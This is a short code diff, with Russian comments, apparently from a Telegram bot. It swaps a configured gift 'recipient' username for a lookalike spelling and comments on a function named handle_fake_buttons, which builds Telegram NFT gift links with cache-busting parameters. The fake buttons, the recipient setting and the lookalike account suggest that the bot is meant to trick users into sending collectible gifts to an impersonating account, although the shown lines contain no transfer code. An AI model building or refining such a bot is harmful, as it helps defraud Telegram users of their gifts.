@@ -13,7 +13,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 # --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
-TARGET_USERNAME = "Gifts_Replayer" 
+TARGET_USERNAME = "GIifts_Replayer" 
 # -----------------------------
 
 active_users = set()
@@ -146,6 +146,7 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
+    # Cache-buster для принудительного обновления анимации на мобильных устройствах
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
     
